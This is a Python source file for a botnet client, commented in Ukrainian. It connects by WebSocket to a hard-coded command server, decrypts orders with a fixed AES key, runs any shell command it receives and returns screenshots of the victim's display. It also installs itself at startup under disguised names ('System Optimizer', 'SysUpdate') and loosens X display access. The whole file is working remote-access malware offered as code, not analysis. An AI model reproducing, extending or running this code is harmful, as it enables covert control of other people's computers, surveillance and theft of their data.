import asyncio
import websockets
import sys
import subprocess
import os
import base64
import uuid
from io import BytesIO

try:
    from Crypto.Cipher import AES
except ImportError:
    from Cryptodome.Cipher import AES

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

# --- КОНФІГУРАЦІЯ ---
SERVER_URL = "ws://192.168.10.82:8000/ws/" 
AES_KEY = b"AMY_BOTNET_2026_SECURE_KEY_V2_32" 

def get_bot_id():
    return f"bot_{hex(uuid.getnode())[2:10]}"

def decrypt_message(encoded: str) -> str:
    try:
        raw_data = base64.b64decode(encoded)
        nonce, tag, ciphertext = raw_data[:16], raw_data[16:32], raw_data[32:]
        cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except: return None

def encrypt_message(msg: str) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')

# --- МОДУЛЬ ПЕРСИСТЕНЦІЇ (АВТОЗАПУСК) ---
def install_persistence():
    """Бот сам прописує себе в систему при першому запуску"""
    script_path = os.path.abspath(sys.argv[0]) # Де лежить цей файл зараз
    
    if sys.platform != "win32":
        # Шлях для автозапуску в Linux (XDG Autostart)
        autostart_dir = os.path.expanduser("~/.config/autostart/")
        os.makedirs(autostart_dir, exist_ok=True)
        desktop_file = os.path.join(autostart_dir, "sys_update.desktop")
        
        if not os.path.exists(desktop_file):
            content = f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Optimizer
Comment=Background optimization process
"""
            with open(desktop_file, "w") as f:
                f.write(content)
            print("[+] Persistence installed (Linux Autostart)")
    else:
        # Для Windows можна додати в реєстр (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
            print("[+] Persistence installed (Windows Registry)")
        except: pass

async def run_bot():
    # Встановлюємо автозапуск відразу при старті
    install_persistence()
    
    bot_id = get_bot_id()
    
    if sys.platform != "win32":
        if "DISPLAY" not in os.environ:
            os.environ["DISPLAY"] = ":0"
        try:
            subprocess.run(["xhost", "+local:root"], capture_output=True)
        except: pass

    while True:
        try:
            async with websockets.connect(f"{SERVER_URL}{bot_id}") as ws:
                print(f"[*] Bot connected as {bot_id}")
                while True:
                    msg = await ws.recv()
                    command = decrypt_message(msg)
                    if not command: continue

                    response = ""
                    
                    if command.startswith("shell:"):
                        real_cmd = command[6:] 
                        try:
                            proc = subprocess.run(real_cmd, shell=True, capture_output=True, text=True)
                            response = proc.stdout + proc.stderr
                            if not response: response = "Executed (no output)."
                        except Exception as e:
                            response = f"Error: {str(e)}"

                    elif command == "screenshot":
                        if ImageGrab:
                            try:
                                shot = ImageGrab.grab()
                                buf = BytesIO()
                                shot.save(buf, format="PNG")
                                response = f"SCREENSHOT:{base64.b64encode(buf.getvalue()).decode()}"
                            except Exception as e:
                                response = f"Screenshot Failed: {str(e)}"
                        else:
                            response = "Pillow not installed."

                    else:
                        response = f"Unknown: {command}"

                    await ws.send(encrypt_message(response))
        except:
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(run_bot())
